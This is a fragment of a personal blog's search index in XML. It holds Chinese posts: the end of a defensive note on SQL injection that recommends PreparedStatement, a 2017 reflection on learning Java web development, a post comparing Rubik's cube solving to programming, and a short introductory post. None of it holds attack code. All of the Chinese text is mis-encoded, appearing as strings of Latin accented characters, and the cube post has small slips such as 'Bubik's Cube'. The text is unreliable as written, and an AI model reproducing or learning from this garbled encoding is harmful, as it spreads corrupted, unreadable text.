å¯¹åº”mysqlæ•°æ®åº“ï¼Œæ³¨é‡Šç¬¦æ˜¯ç”¨#å·ï¼Œå¦‚æžœæ˜¯å…¶ä»–æ•°æ®åº“ï¼Œæ¯”å¦‚SQL Serveræ•°æ®åº“ï¼Œæˆ‘ä»¬è¦ä½¿ç”¨ä¸¤ä¸ª - ç¬¦å·å³å¯æ³¨é‡ŠæŽ‰åŽé¢çš„sqlè¯­å¥ã€‚sqlæ‹¼æŽ¥çš„è¿™ç§è¯­å¥å¾ˆå®¹æ˜“è®©æ”»å‡»è€…æ³¨å…¥ï¼Œåªéœ€è¦å¤šè¯•å‡ æ¬¡å°±å¯ä»¥å®žçŽ°æ³¨å…¥ã€‚ ä¸ºäº†é˜²æ­¢è¿™ç§å¸¸è§çš„ä½Žçº§æ³¨å…¥ï¼Œæˆ‘ä»¬ä¸è¦ä½¿ç”¨æ‹¼æŽ¥sqlçš„æ–¹å¼æ¥æŸ¥è¯¢æ•°æ®åº“ã€‚æˆ‘å‘çŽ°ç›®å‰çš„æ•™ç§‘ä¹¦å’Œå­¦æ ¡æ•™çš„webç¼–ç¨‹è¯¾ç¨‹ä¸­éƒ½æ²¡æœ‰æåˆ°ç±»ä¼¼çš„å®‰å…¨æ€§é—®é¢˜ï¼Œä¸ºäº†ä¾¿äºŽå­¦ç”Ÿç†è§£ï¼Œå¾ˆå¤šéƒ½æ˜¯ä½¿ç”¨sqlæ‹¼æŽ¥ï¼Œæˆ‘è§‰å¾—å…³äºŽwebå®‰å…¨è¿™ç‚¹åœ¨å­¦ä¹ è¿‡ç¨‹ä¸­ä¸€å®šè¦æ—¶åˆ»æ³¨æ„ï¼Œé˜²æ­¢çŠ¯ä¸€äº›ä½Žçº§é”™è¯¯ã€‚è¦å§‹ç»ˆç‰¢è®°ï¼Œç”¨æˆ·çš„è¾“å…¥æ°¸è¿œéƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼Œä¸€å®šè¦åšæ ¡éªŒå’Œè½¬æ¢ã€‚åƒhibernateè¿™ç±»ORMæ¡†æž¶å·²ç»æ›¿æˆ‘ä»¬å®žçŽ°å¥½äº†è¿™ä¸€ç‚¹ï¼Œå¦‚æžœè¦è‡ªå·±ç”¨jdbcå†™çš„è¯ï¼Œå»ºè®®ä½¿ç”¨PreparedStatementè¿›è¡Œä¼ å‚æ•°çš„æ–¹å¼é˜²æ­¢sqlæ³¨å…¥ã€‚ä»Žç½‘ç»œå®‰å…¨çš„è§’åº¦åŽ»æ€è€ƒé—®é¢˜ï¼Œæœ‰åŠ©äºŽå¼€å‘å‡ºæ¯”è¾ƒå¥å£®ç›¸å¯¹æ¯”è¾ƒå®‰å…¨çš„ç½‘ç«™ã€‚å¯¹æé«˜è‡ªèº«ç¼–ç¨‹æ°´å¹³ä¹Ÿæ˜¯æœ‰å¸®åŠ©çš„ã€‚å¦‚æžœä»Žäº‹webå¼€å‘ï¼Œè¿™ç§å®‰å…¨é—®é¢˜å…¶å®žä¹Ÿæ˜¯å¿…é¡»è¦æŒ‡å®šå¹¶ä¸”å°½é‡åŽ»é¿å…çš„ã€‚æ¡†æž¶è™½ç„¶å¸®æˆ‘ä»¬å®žçŽ°äº†è¿™äº›åŠŸèƒ½ä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯è¦åŽ»å­¦ä¹ ä»–ï¼Œæˆ‘ä»¬å¯ä»¥å­¦ä¹ æ¡†æž¶çš„è®¾è®¡æ€æƒ³ï¼Œè¾¾åˆ°æé«˜è‡ªå·±çš„ç›®çš„ã€‚æ¯”è¾ƒå¸¸è§çš„webæ”»å‡»é™¤äº†sqlæ³¨å…¥ï¼Œè¿˜æœ‰xssç­‰ã€‚æˆ‘åœ¨åŽç»­çš„æ–‡ç« ä¸­ä¼šè®²åˆ°ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ç¼–ç¨‹æ˜¯ä¸€ç§ä¿¡ä»°]]></title>
    <url>%2Fe8cdb82b%2F</url>
    <content type="text"><![CDATA[ä»Šå¤©æ˜¯2017å¹´12æœˆ1æ—¥ï¼Œæ˜¯ä¸€ä¸ªæœˆæ–°çš„å¼€å§‹ã€‚åŒæ—¶ï¼Œä»Šå¤©ä¹Ÿæ˜¯æ˜ŸæœŸäº”ï¼Œä¸€å‘¨çš„ç»“æŸã€‚è·ç¦»2018å¹´ä»…æœ‰1ä¸ªæœˆçš„æ—¶é—´ï¼Œå›žæœ›ä¸€ä¸‹å³å°†è¿‡åŽ»çš„2017å¹´ï¼Œè¿™é‡Œåšä¸€ä¸‹æ€»ç»“ã€‚å¤§å­¦ä¸»æ”»Javaï¼Œæžäº†3å¹´çš„Androidåº”ç”¨å¼€å‘ã€‚ä»ŽAndroid 2.3ä¸€ç›´åˆ°Android7.0ç‰ˆæœ¬ï¼ŒAndroidå¼€å‘å·¥å…·ä¹Ÿä»ŽEclipseè½¬ç§»åˆ°äº†AndroidStudioï¼Œç”¨AndroidStudioå¼€å‘è¿‡é¡¹ç›®çš„äººéƒ½çŸ¥é“ï¼Œè¿™æ˜¯Googleå®˜æ–¹æŽ¨èçš„ä¸“ä¸šAndroidå¼€å‘å·¥å…·ï¼Œä»–åŸºäºŽIntelliJ IDEAå¼€å‘ï¼Œå¹¶ä¸”ä½¿ç”¨Gradleæ¥æž„å»ºé¡¹ç›®ï¼Œéœ€è¦çš„ç¬¬ä¸‰æ–¹åº“åªéœ€è¦åŠ å…¥ä¾èµ–å³å¯ï¼Œæ¯‹åº¸ç½®ç–‘è¿™æ˜¯ä¸€æ¬¾éžå¸¸ä¸“ä¸šçš„å¼€å‘å·¥å…·ï¼Œç›´åˆ°2017å¹´1æœˆä»½æˆ‘ä»ç„¶åœ¨ä½¿ç”¨AndroidStudioæ¥å¼€å‘å­¦ä¹ æœ€æ–°çš„Android7.0æ–°ç‰¹æ€§ã€‚å¤§å­¦æœŸé—´é™¤äº†ä¸»æ”»çš„Javaå¤–ï¼Œå­¦æ ¡è¿˜ä¸Šäº†å¾ˆå¤šè¯¾ç¨‹ï¼Œæ¯”å¦‚cã€c#ã€ASP.NETã€SQL Serverç­‰ï¼Œå¦å¤–è‡ªå·±è¿˜ä¹°æ¥Pythonçš„ä¹¦ï¼Œè¿˜æœ‰æ ‘èŽ“æ´¾ã€Arduinoç­‰ï¼Œä¸­é—´è¿˜æŠ˜è…¾è¿‡Unity3ï¼ŒARå¢žå¼ºçŽ°å®žï¼Œé¥æŽ§å°è½¦ç­‰â€¦â€¦å¤§å­¦åŸºæœ¬åœ¨å­¦æ ¡çš„å·¥ä½œå®¤åº¦è¿‡çš„,æ‰€ä»¥æœ‰å¤§æŠŠçš„æ—¶é—´è¿›è¡ŒæŠ˜è…¾ï¼Œå¯ä»¥è¯´æˆ‘çš„å¤§å­¦ç”Ÿæ´»è¿‡çš„å¾ˆå……å®žã€‚éšç€åº”ç”¨å¸‚åœºçš„é¥±å’Œï¼ŒåŸºæœ¬å·²ç»ä¸ç¼ºæ—¥å¸¸çš„Appåº”ç”¨äº†ï¼Œé™¤äº†å¯ä»¥è‡ªå·±å¼€å‘æ—¥å¸¸ä½¿ç”¨çš„å·¥å…·ç±»Appï¼Œå‰©ä¸‹çš„androidå¼€å‘éœ€æ±‚åŸºæœ¬éƒ½åœ¨å¤–åŒ…å’Œäº§å“ä¸Šäº†ã€‚Javaçš„ä¸»è¦å¸‚åœºåœ°ä½å…¶å®žæ˜¯åœ¨Webåº”ç”¨å¼€å‘é¢†åŸŸï¼Œä¹‹å‰æˆ‘ä¸€ç›´æƒ³ä»Žäº‹Java Webå¼€å‘å´ä¸€ç›´æ²¡æœ‰æœºä¼šï¼Œå†™äº†å¤šå¹´çš„ç§»åŠ¨ç«¯ï¼Œæ¯æ¬¡å’ŒåŽå°å¯¹æŽ¥å£ï¼Œè§£æžåˆ«äººå®šä¹‰å¥½çš„æ•°æ®æ ¼å¼ï¼Œæˆ‘æ˜¯æ»¡æ»¡çš„ç¾¡æ…•ï¼Œä¸šåŠ¡çš„æ ¸å¿ƒåŸºæœ¬éƒ½æ˜¯åœ¨åŽç«¯ï¼Œå¸Œæœ›è‡ªå·±èƒ½å†™æœåŠ¡ç«¯ï¼Œèƒ½å¤Ÿæˆä¸ºå®šåˆ¶è§„åˆ™çš„äººã€‚ä¸€æ¬¡æœºç¼˜å·§åˆçš„æœºä¼šï¼Œæˆ‘ä»¬å·¥ä½œå®¤åˆšå¥½ç¼ºå°‘Java Webå¼€å‘çš„äººå‘˜ï¼ŒAndroidå¼€å‘çš„äººå€’æ˜¯ä¸€å¤§å †ã€‚æ‰€ä»¥æˆ‘å°±è·Ÿæˆ‘ä»¬å·¥ä½œå®¤è€å¸ˆè¯´æˆ‘æƒ³ä»Žäº‹Java Webå¼€å‘ã€‚ä»Žç¬¬ä¸€ä¸ªå›­åŒºé¡¹ç›®å¼€å§‹åˆ°çŽ°åœ¨ä¸ºæ­¢ï¼Œæˆ‘å·²ç»å‚ä¸Žåšäº†å‡ ä¸ªWebé¡¹ç›®äº†ï¼Œå…¶ä¸­èµ°è¿‡äº†ä¸å°‘å‘ï¼Œä¹Ÿå­¦ä¹ åˆ°äº†å¾ˆå¤šã€‚å¼€å‘åŸºæœ¬éƒ½æ˜¯é è‡ªå­¦ï¼Œæ¯‹åº¸ç½®ç–‘ ç¼–ç¨‹çš„çŸ¥è¯†éœ€è¦é è‡ªå·±åŽ»å­¦ï¼Œå¦‚æžœè¦å­¦å¥½å®ƒè¦è‡ªå·±åŽ»ä¸“ç ”ï¼Œé€šè¿‡çœ‹æ•™å­¦è§†é¢‘å¯ä»¥çŸ­æœŸå†…æé«˜è®¤çŸ¥æ°´å¹³ï¼Œä½†è¿˜æ˜¯è¿œè¿œä¸å¤Ÿçš„ï¼Œéœ€è¦å¤šå†™å¤šç»ƒä¹ ï¼Œå­¦ä¹ åˆ«äººçš„ç¼–ç¨‹æ€æƒ³ã€‚Java webå¼€å‘åˆšå¼€å§‹æ—¶ï¼Œæˆ‘å’Œä¼ ç»Ÿçš„å­¦æ³•ä¸€æ ·ï¼Œä¸ç®¡æŠ€æœ¯è¿‡ä¸è¿‡æ—¶ï¼Œä¹‹å‰æœ‰æ²¡æœ‰å­¦è¿‡ï¼Œå…¨éƒ¨é‡æ–°å…ˆè¿‡ä¸€éï¼Œä»Žæœ€åŸºç¡€çš„ htmlã€cssã€jsã€jQueryã€jspã€servletã€jdbcåˆ°æ¡†æž¶Springã€Spring MVCã€Hibernateéƒ½è¿‡äº†ä¸€éï¼Œä¸æ•¢è¯´å…¨éƒ¨æŽŒæ¡ï¼Œä½†æ˜¯å¼€å‘é¡¹ç›®å·²ç»ä¸æˆé—®é¢˜ã€‚æžå¼€å‘ä»…ä»…ä¼šç¼–ç¨‹è¿˜æ˜¯ä¸å¤Ÿçš„ï¼Œè¿˜è¦æŽŒæ¡å„ç§å·¥å…·å’Œæ–¹æ³•ï¼Œæ¯”å¦‚Mavenå’ŒGradleæž„å»ºï¼Œsvnå’Œgitç‰ˆæœ¬æŽ§åˆ¶ç­‰ï¼Œå°¤å…¶æ˜¯webå¼€å‘ï¼Œæœ€å¥½è¦æœ‰æ‰Žå®žçš„æ•°æ®åº“åŠŸåº•ï¼Œå¯¹è§£å†³å„ç§ä¼˜åŒ–æŸ¥è¯¢ å¹¶éžæŸ¥è¯¢çš„é—®é¢˜ çœŸçš„å¾ˆæœ‰ç”¨ã€‚æˆ‘å¾ˆæ¬£æ…°ä¹‹å‰æœ‰æ‰Žå®žçš„JavaåŠŸåº•ï¼Œè¿™äº›å¯¹æˆ‘æ¥è¯´åªæ˜¯çŸ¥è¯†å‚¨å¤‡é‡çš„é—®é¢˜ï¼Œä½†Java Webè¦å­¦çš„è¿˜æœ‰å¾ˆå¤šï¼Œè¿™æ—¶å€™åƒä¸‡ä¸èƒ½åœæ­¢å­¦ä¹ çš„è„šæ­¥ã€‚æœ€è¿‘æˆ‘åœ¨å­¦ä¹ å½“å‰æ¯”è¾ƒä¸»æµçš„æŠ€æœ¯ Vueã€SpringBootã€Mybatisã€Srping Cloud åˆ†å¸ƒå¼ç­‰ã€‚æˆ‘çš„æ¯•è®¾å†³å®šåšä¸€ä¸ªåˆ†å¸ƒå¼APIç½‘å…³ï¼Œä»ŽåŽŸå…ˆçš„Java Webå…¥é—¨å°ç™½åˆ°èƒ½å¤Ÿè‡ªå·±åŽ»å‘çŽ°çŸ¥è¯†è¿ç”¨çŸ¥è¯†ï¼Œæˆ‘ç”¨äº†å°†è¿‘å¿«ä¸€å¹´ï¼Œè™½ç„¶è¿˜ä¸æ˜¯å¾ˆä¼˜ç§€ï¼Œä½†æ˜¯æˆ‘æ„Ÿåˆ°å¾ˆæ¬£æ…°ã€‚ç¼–ç¨‹å°±åƒæ˜¯æˆ‘çš„ä¿¡ä»°ä¸€æ ·ï¼Œé©±ä½¿ç€æˆ‘ä¸æ–­å‰è¡Œã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[é­”æ–¹çš„è‰ºæœ¯]]></title>
    <url>%2Ffa5a2a73%2F</url>
    <content type="text"><![CDATA[æœ€è¿‘å–œæ¬¢ä¸Šäº†çŽ©é­”æ–¹ï¼Œå› ä¸ºé­”æ–¹è¿˜åŽŸçš„æ­¥éª¤å°±åƒç¼–ç¨‹ï¼Œé­”æ–¹SDKçš„é­…åŠ›ä¿ƒä½¿æˆ‘ç‰¹æ„ä¹°äº†2åˆ°5é˜¶çš„é­”æ–¹ï¼Œå‡†å¤‡è®­ç»ƒä¸€ä¸‹è‡ªå·±çš„é€»è¾‘æ€ç»´èƒ½åŠ›ã€‚çŽ©é­”æ–¹å’Œå­¦ç¼–ç¨‹ä¸€æ ·ï¼Œå¿«é€Ÿçš„å…¥é—¨æ–¹æ³•å°±æ˜¯çœ‹æ“ä½œæ‰‹å†Œï¼Œç›®æ ‡å¯¼å‘æœ‰åŠ©äºŽä¸€ä¸ªå¥½çš„å¼€å§‹ï¼Œé€šè¿‡ç ”ç©¶åˆ«äººçš„é­”æ–¹è¿˜åŽŸæ­¥éª¤ï¼Œæˆ‘æˆåŠŸçš„è¿˜åŽŸäº†æ•´ä¸ª3é˜¶é­”æ–¹ã€‚é­”æ–¹ï¼Œè‹±æ–‡åä¸ºBubikâ€™s Cube,é­”æ–¹æ˜¯åœ¨1974å¹´åŒˆç‰™åˆ©å¸ƒè¾¾ä½©æ–¯å»ºç­‘å­¦é™¢åŽ„å°”è¯ºÂ·é²æ¯”å…‹æ•™æŽˆå‘æ˜Žçš„ï¼Œæ‰€ä»¥åˆå«åšé²æ¯”å…‹æ–¹å—ã€‚é­”æ–¹çš„å‘æ˜Žæœ€åˆæ˜¯ä¸ºäº†å¸®åŠ©å­¦ç”Ÿè®¤çŸ¥ç©ºé—´ç«‹æ–¹ä½“çš„ç»„æˆç»“æž„ï¼Œé”»ç‚¼å­¦ç”Ÿçš„è®°å¿†èƒ½åŠ›å’Œç©ºé—´æ€ç»´èƒ½åŠ›ã€‚çŽ°å¦‚ä»Šå·²ç»å‘å±•æˆä¸ºä¸€ç§æ‰‹éƒ¨æžé™è¿åŠ¨ï¼Œé­”æ–¹æ˜¯ä¸€é¡¹æ™ºåŠ›è¿åŠ¨ã€‚ é­”æ–¹èƒŒåŽçš„æ•°å­¦æ˜¯ç¾¤è®ºï¼Œé­”æ–¹è¢«æ‰“ä¹±çš„å˜åŒ–æ€»æ•°ä¸º 4.3X10^19 ï¼Œç›®å‰äººç±»è¿˜åŽŸä¸‰é˜¶é­”æ–¹çš„ä¸–ç•Œçºªå½•æ˜¯4.59ç§’ï¼Œè€Œä¸“é—¨çš„é­”æ–¹æœºå™¨äººåˆ™å¯ä»¥1ç§’è¿˜åŽŸï¼Œç†è®ºä¸Šå¯ä»¥æ›´å¿«ã€‚å¾ˆå¤šé­”æ–¹é«˜æ‰‹éƒ½æœ‰è‡ªå·±è¿˜åŽŸé­”æ–¹çš„ä¸€äº›ç®—æ³•ï¼Œä½†æ˜¯æœ€å¿«çš„ç®—æ³•æ˜¯21æ­¥ä»¥å†…è¿˜åŽŸã€‚é€šè¿‡è®¡ç®—æœºè®¡ç®—å¾—åˆ°çš„é­”æ–¹è¿˜åŽŸæ­¥éª¤å¯çŸ¥ï¼Œè¢«æ‰“ä¹±çš„ä»»ä½•ä¸‰é˜¶é­”æ–¹ç†è®ºä¸Šéƒ½å¯ä»¥é€šè¿‡21æ­¥ä»¥å†…è¿˜åŽŸã€‚ ä¸ºäº†å­¦ä¹ é­”æ–¹ï¼Œæˆ‘ç‰¹æ„ä¹°äº†2345é˜¶çš„é­”æ–¹ã€‚ æŠŠä¸‰é˜¶é­”æ–¹æ‰“ä¹±ï¼Œè¿˜åŽŸå‰ã€‚ è¿˜åŽŸåŽ è¿˜åŽŸé­”æ–¹å¯ä»¥ç»ƒå°è„‘ï¼Œå¯ä»¥ç”¨ä¸åŒçš„è§£æ³•å¤šåŠ è®­ç»ƒï¼Œæé«˜è‡ªå·±çš„ç©ºé—´æ€ç»´èƒ½åŠ›å’Œè®°å¿†åŠ›ã€‚åœ¨è¿˜åŽŸé­”æ–¹çš„è¿‡ç¨‹ä¸­ï¼Œåœ¨æˆ‘çœ‹æ¥å°±åƒæ˜¯åœ¨åšè½¯ä»¶å·¥ç¨‹ã€‚é¦–å…ˆåˆ†æžéœ€æ±‚ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯è¿˜åŽŸé­”æ–¹çš„6ä¸ªé¢ã€‚å¥—ç”¨åˆ«äººçš„æ­¥éª¤å…¬å¼æ¥è¿˜åŽŸé­”æ–¹ï¼Œå°±åƒæ˜¯ç¼–ç¨‹ä¸­çœ‹åˆ«äººçš„apiæ–‡æ¡£æ¥å¼€å‘ä¸€æ ·ã€‚ç›®æ ‡ä¸ºå¯¼å‘å°±æ˜¯ä¸ºäº†è§£å†³é—®é¢˜å¾—åˆ°é¢„æœŸç›®æ ‡ç»“æžœï¼Œåœ¨æ¯æ¬¡è¿˜åŽŸé­”æ–¹çš„å·¥ç¨‹ä¸­æˆ‘ä»¬ç”¨äº†ä¸€äº›ä¸ç†è§£çš„æ­¥éª¤ï¼Œå¯ä»¥å…ˆä¸ç”¨ç†ä¼šä»–ï¼Œç…§åšå°±æ˜¯ã€‚æœ€åŽæˆ‘ä»¬æˆåŠŸçš„è¿˜åŽŸäº†é­”æ–¹ï¼Œè¾¾åˆ°æœ€ç»ˆç›®æ ‡ã€‚å½“ç„¶ï¼Œç»ƒä¹ å°è„‘ä¸ä»…ä»…æ˜¯å¥—ç”¨å…¬å¼æ¥è¾¾åˆ°è‚Œè‚‰è®°å¿†ï¼Œæˆ‘ä»¬è¿˜åº”è¯¥åŽ»ä¸“ç ”è¿˜åŽŸæ­¥éª¤çš„é€»è¾‘åŽŸç†ï¼Œæé«˜æˆ‘ä»¬çš„è®¤çŸ¥å’Œè®°å¿†èƒ½åŠ›ï¼Œåœ¨æŽŒæ¡æŸä¸ªç¼–ç¨‹è¯­è¨€çš„apiåŽï¼Œæˆ‘ä»¬åº”è¯¥æ·±å…¥åº•å±‚ï¼ŒæŽŒæ¡æ ¸å¿ƒåŽŸç†ã€‚æ¯«æ— ç–‘é—®ï¼Œé­”æ–¹SDKå¯ä»¥æé«˜æˆ‘ä»¬çš„æ€ç»´èƒ½åŠ›ï¼Œæ˜¯äººè„‘ç†è§£ç¼–ç¨‹çš„ä¸€ç§æ–¹å¼ã€‚é­”æ–¹æ˜¯ä¸€ç§è‰ºæœ¯ï¼]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å¹´è½»çš„æˆ˜åœº]]></title>
    <url>%2Fb1d4025b%2F</url>
    <content type="text"><![CDATA[ä½ å¥½ï¼Œä¸–ç•Œï¼æˆ‘æ˜¯è“å£«é’¦ã€‚è¿™æ˜¯ä¸€ç¯‡ç®€å•çš„å¼€å§‹ï¼Œæˆ‘ä¼šå¥½å¥½åŠªåŠ›ï¼Œä¹¦å†™ç²¾å½©çš„è‡ªå·±ã€‚ç«™åœ¨è¿™å¹´è½»çš„æˆ˜åœºï¼Œæˆ‘æ€€æ£ä¸€ä¸ªåšå®šçš„ä¿¡ä»°ï¼Œæœªæ¥çš„è¿œæ–¹åœ¨å¬å”¤ï¼Œå‰è¡Œçš„è·¯è¿˜å¾ˆæ¼«é•¿ï¼Œè¯·å¤šå¤šæŒ‡æ•™ã€‚]]></content>
      <categories>
        <category>éšç¬”</category>
      </categories>
      <tags>
        <tag>éšç¬”</tag>
      </tags>
  </entry>
</search>
